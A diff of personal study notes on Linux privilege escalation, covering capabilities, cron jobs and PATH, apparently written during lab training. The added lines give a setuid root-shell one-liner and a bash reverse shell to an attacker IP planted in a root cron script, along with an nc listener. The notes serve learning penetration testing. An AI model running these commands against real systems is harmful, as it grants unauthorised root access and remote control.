@@ -51,16 +51,15 @@ Privilege escalation means gaining higher permissions from a lower-level account
 - System administrators can use **Capabilities** to give specific privileges to a process or binary without granting full root access.  For example, if a SOC analyst needs to use a tool that requires opening network connections, a regular user cannot do it. without give the user full privileges, the admin can assign the required **Capability** to the tool. This allows the tool to work without needing root access.
 - We can use the `getcap` tool to list enabled capabilities.  (   getcap -r / 2>/dev/null  )
 - if found cap_setuid+ep  search about the program in https://gtfobins.github.io/
-- ./view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'   you must sure the version of python in the machine
+- ex : ./view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'   you must sure the version of python in the machine
 
 ## Privilege Escalation: Cron Jobs
 
 - Cron Jobs are used to run scripts or executables at specific times and operate with the privileges of their owner. If there is a cron job running as root and we can modify the script it executes, our script will run with root privileges.
 - Any user can read the file keeping system-wide cron jobs under /etc/crontab
-- when found file , The file should look like this;
-    
-    ![2025-02-19 17_01_00-kali-linux-2024.3-vmware-amd64 - VMware Workstation.png](attachment:5eef8dab-0d48-452e-9719-17cad5a45ac5:2025-02-19_17_01_00-kali-linux-2024.3-vmware-amd64_-_VMware_Workstation.png)
-    
+- when found file , The file should contain the :
+     - #!/bin/bash
+     -  bash -c ‘bash -i >& /dev/tcp/<your-ip>/7777 0>&1’   
 - We will now run a listener on our attacking machine to receive the incoming connection. ( nc -nvlp 7777 )
 
 ## Privilege Escalation: PATH
